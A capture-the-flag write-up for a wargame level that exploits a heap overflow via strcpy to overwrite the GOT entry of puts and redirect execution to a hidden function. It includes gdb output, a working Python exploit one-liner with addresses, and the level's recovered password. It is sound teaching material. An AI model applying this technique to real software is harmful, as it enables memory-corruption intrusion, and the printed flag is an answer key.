# Level 7: Heap Overflow to GOT Overwrite

## Challenge Overview

Level 7 builds on the heap overflow concepts from level 6, but introduces a more complex memory corruption technique: GOT (Global Offset Table) overwriting.

## Source Code

Using Ghidra, we can get a source code representation of the binary that looks like this:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68]; // Global buffer used in both functions

void m(void *unused1, int unused2, char *unused3, int unused4, int unused5)
{
  time_t current_time;

  current_time = time(NULL);
  printf("%s - %d\n", c, current_time);
  return;
}

int main(int argc, char **argv)
{
  int *first_struct;
  void *temp_ptr;
  int *second_struct;
  FILE *password_file;

  first_struct = (int *)malloc(8);
  *first_struct = 1;
  temp_ptr = malloc(8);
  first_struct[1] = (int)temp_ptr;

  second_struct = (int *)malloc(8);
  *second_struct = 2;
  temp_ptr = malloc(8);
  second_struct[1] = (int)temp_ptr;

  strcpy((char *)first_struct[1], argv[1]);
  strcpy((char *)second_struct[1], argv[2]);

  password_file = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, password_file);
  puts("~~");
  return 0;
}
```

## Source Code Analysis

Looking at the source code, we can identify several interesting aspects:

1. There's a global buffer `c` that will store the password from the `.pass` file
2. Function `m()` exists but is never called from `main()`
3. Function `m()` would print the content of buffer `c` if called
4. The program creates two pairs of malloc'd structures:

   - `first_struct[0]` contains value 1
   - `first_struct[1]` points to another buffer that gets filled with argv[1]
   - `second_struct[0]` contains value 2
   - `second_struct[1]` points to another buffer that gets filled with argv[2]

   It's important to understand that `strcpy` doesn't write into the struct fields directly, but rather into the memory that those fields point to:

   ```
   ┌───────────────┐          ┌───────────────┐
   │ first_struct  │          │  malloc'd     │
   │ ┌───────────┐ │          │  buffer       │
   │ │ value: 1  │ │          │               │
   │ └───────────┘ │          │  (argv[1]     │
   │ ┌───────────┐ │  points  │   is copied   │
   │ │ pointer ──┼─┼─────────>│   here)       │
   │ └───────────┘ │          │               │
   └───────────────┘          └───────────────┘
   ```

   When `strcpy((char *)first_struct[1], argv[1])` is called, it writes to the memory address stored in `first_struct[1]`, not to `first_struct[1]` itself. The cast `(char *)` tells strcpy to treat this address as a destination for writing string data.

5. Both `strcpy()` calls are vulnerable to buffer overflow since they don't check the size of the input

## Vulnerability

The vulnerability lies in the two `strcpy()` calls that don't perform bounds checking. This allows an attacker to:

1. Overflow the first buffer and overwrite the value of `second_struct[1]`
2. Change where the second `strcpy()` writes its data
3. Effectively achieve an arbitrary write primitive (write any value to any writable memory location)

## Exploitation Strategy

Our goal is to make the program call function `m()`, which will print the password from the global buffer `c`.

The strategy is:

1. Use the first `strcpy()` overflow to change `second_struct[1]` to point to the GOT entry of `puts`
2. Use the second `strcpy()` to overwrite the GOT entry of `puts` with the address of function `m`
3. When the program calls `puts("~~")` near the end, it will actually call `m()` instead
4. Function `m()` will print the password that was read into the global buffer `c`

Here's a visual representation of our attack:

```
Initial state:
┌────────────────┐      ┌────────────┐      ┌────────────────┐      ┌────────────┐
│ first_struct   │      │ buffer1    │      │ second_struct  │      │ buffer2    │
├────────────────┤      ├────────────┤      ├────────────────┤      ├────────────┤
│ [0]: value 1   │      │            │      │ [0]: value 2   │      │            │
├────────────────┤      │            │      ├────────────────┤      │            │
│ [1]: ──────────┼─────>│ (argv[1])  │      │ [1]: ──────────┼─────>│ (argv[2])  │
└────────────────┘      └────────────┘      └────────────────┘      └────────────┘

Step 1: Overflow buffer1 to change second_struct[1]
┌────────────────┐      ┌────────────────────────────────────────────┐
│ first_struct   │      │ buffer1                                    │
├────────────────┤      ├───────────────────────────┬────────────────┤
│ [0]: value 1   │      │                           │                │
├────────────────┤      │                           │                │
│ [1]: ──────────┼─────>│ AAAAA...                  │ 0x8049928(GOT) │───┐
└────────────────┘      └───────────────────────────┴────────────────┘   │
                                                    ▲                    │
                                                    │                    │
┌────────────────┐      ┌────────────┐              │                    │
│ second_struct  │      │ buffer2    │              │                    │
├────────────────┤      ├────────────┤              │                    │
│ [0]: value 2   │      │            │              │                    │
├────────────────┤      │            │              │                    │
│ [1]: ──────────┼─────>│ (argv[2])  │              │                    │
└────────────────┘      └────────────┘              │                    │
                                                    │                    │
                        2nd strcpy writes here ─────┘                    │
                                                                         │
Step 2: Use second_struct[1] (now pointing to GOT) to write m's address  │
                                                                         │
                      Global Offset Table (GOT)                          │
                      ┌────────────────────────┐                         │
                      │ ...                    │                         │
                      ├────────────────────────┤                         │
                      │ puts: 0x08048400       │<────────────────────────┘
                      │       ↓                │
                      │       0x080484f4       │ ← Overwritten with addr of m()
                      ├────────────────────────┤
                      │ ...                    │
                      └────────────────────────┘

Step 3: When the program calls puts("~~"), it jumps to m() instead

┌────────────┐     ┌───────────────┐     ┌───────────────────────┐
│ main()     │     │ puts@plt      │     │ m()                   │
│            │     │               │     │                       │
│ ...        │     │               │     │ printf("%s - %d", c); │
│ puts("~~") │────>│ jmp *0x8049928│────>│                       │
│ ...        │     │               │     │                       │
└────────────┘     └───────────────┘     └───────────────────────┘
```

## Exploitation Steps

1. Find the address of function `m`:

   ```
   (gdb) disas m
   Dump of assembler code for function m:
      0x080484f4 <+0>:     push   %ebp
      ...
   ```

   The address of `m` is `0x080484f4`

2. Find the GOT entry for `puts`:

   ```
   (gdb) disas puts
   Dump of assembler code for function puts@plt:
      0x08048400 <+0>:     jmp    *0x8049928
      ...
   ```

   The GOT entry for `puts` is at `0x8049928`. Check level6 for more details about the jump instruction.

3. Determine the offset needed to overwrite `second_struct[1]` with the first overflow:

   - We need to find the distance from the buffer pointed to by first_struct[1] (where argv[1] is written) to the memory location of second_struct[1]
   - Using GDB, we can find the address of both locations:

   ```
   (gdb) disas main
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt> # first_struct malloc
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   ...
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt> # temp_ptr for first_struct[1]
   0x08048550 <+47>:    mov    %eax,%edx
   ...
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt> # second_struct malloc
   0x08048565 <+68>:    mov    %eax,0x18(%esp)

   ```

   - Set breakpoints after the malloc calls to examine memory addresses:

   ```
   (gdb) break *0x08048550   # After temp_ptr for first_struct[1] gets assigned
   (gdb) break *0x08048585   # After second_struct[1] gets assigned
   (gdb) run test1 test2

   Breakpoint 1, 0x08048550 in main ()
   (gdb) x $eax                  # Value of temp_ptr for first_struct[1]
   0x804a018:      0x00000000    # This is where argv[1] will be copied

   (gdb) continue
   Breakpoint 2, 0x08048585 in main ()
   (gdb) x $eax             # Examine second_struct
   0x804a028:      0x00000002
   (gdb) x &0x804a028[1]    # Address of second_struct[1]
   0x804a02c:      0x0804a038    # This is what we want to overwrite
   ```

   - Calculate the offset: 0x804a02c - 0x804a018 = 0x14 (20 in decimal)

4. Create and run the exploit:
   ```bash
   ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
   ```

This command:

1. Overwrites `second_struct[1]` with the address of `puts` GOT entry (`0x8049928`) using the first argument
2. Writes the address of function `m` (`0x080484f4`) to the GOT entry using the second argument
3. When the program calls `puts("~~")`, it actually calls `m()`
4. Function `m()` prints the content of buffer `c` which contains the password

## Getting the Password

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1745411231
```

The password for level8 is: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
